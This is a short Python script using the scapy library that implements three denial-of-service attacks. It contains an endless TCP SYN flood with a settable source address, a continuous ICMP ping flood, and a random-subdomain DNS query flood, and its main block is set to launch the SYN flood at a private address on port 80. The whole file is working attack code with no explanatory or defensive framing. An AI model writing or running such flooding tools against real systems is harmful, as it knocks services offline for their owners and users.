from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import Ether


def DoS_SYN(target_ip, source_ip, target_port, iface):
    ether = Ether()
    ip = IP(dst=target_ip, src=source_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raww = Raw(load="X" * 1024)
    packet = ether / ip / tcp / raww
    sendp(packet, iface=iface, loop=1, verbose=1, inter=0.000001)


def DoS_ICMP(target_ip, source_ip, iface, delay=2):
    ether = Ether()
    ip = IP(dst=target_ip, src=source_ip)
    icmp = ICMP(type=8)

    while True:
        payload = Raw(os.urandom(random.randint(1000,1200)))
        pkt = ether/ ip / icmp / payload
        sendp(pkt, iface=iface, verbose =1)
        time.sleep(delay)

def generate_random_subdomain():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k =14)) + '.local'


def bruteforce_DNS(target_ip,source_ip,count=10000):
    for _ in range(count):
        ether = Ether()
        domain = generate_random_subdomain()
        pkt = ether / IP(src=source_ip,dst=target_ip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=domain))
        sendp(pkt, iface='wlan0',verbose=0,inter=0.001)
        print(f"Sent DNS query for: {domain}")

        
if __name__ == "__main__":
    target_ip = "10.99.99.1"
    source_ip = "10.99.99.162"
    target_port = 80
    iface = "wlan0"
    DoS_SYN(target_ip, source_ip, target_port, iface)
    # DoS_ICMP(target_ip, source_ip, iface, delay=0.01)
    # bruteforce_DNS(target_ip,source_ip,count=10000)
